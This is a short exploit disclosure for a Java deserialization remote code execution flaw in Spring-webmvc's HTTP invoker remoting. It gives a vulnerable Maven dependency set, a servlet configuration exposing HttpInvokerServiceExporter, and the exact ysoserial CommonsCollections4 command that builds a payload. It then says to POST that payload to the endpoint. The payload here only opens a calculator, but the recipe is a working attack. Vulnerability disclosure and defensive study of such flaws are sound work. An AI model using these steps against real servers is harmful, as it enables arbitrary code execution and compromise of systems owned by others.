# Spring-webmvc remote code execution vulnerability #

**project name**： Spring-webmvc <br>
**Versions Affected**: 5.2.x, 5.1.x, <br>
**Exploit Author**: Lynx@vfsec.com <br>
**Homepage**: https://spring.io/projects/spring-framework , https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html <br>


## exploit_detail <br>
    
Build the Maven project for Spring-WebMVC RPC(Remote Method Call)，pom.xml： <br>
```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>5.2.8.RELEASE</version>
</dependency>
```

example-servlet.xml:
```
<bean name="/hello" class="org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter">
    <property name="service">
        <bean class="com.example.springweb.mvc.simpleHelloWorld"></bean>
    </property>
    <property name="serviceInterface">
        <value>com.example.springweb.mvc.HelloWorld</value>
    </property>
</bean>
```


USE ysoserial_tool to generate the payload，command is `java -jar ysoserial_tools/ysoserial-0.0.5.jar CommonsCollections4 "calc" > ysoserial_tools/test.ser`
Submit test.ser as a POST request to the Spring-webmvc-rpc API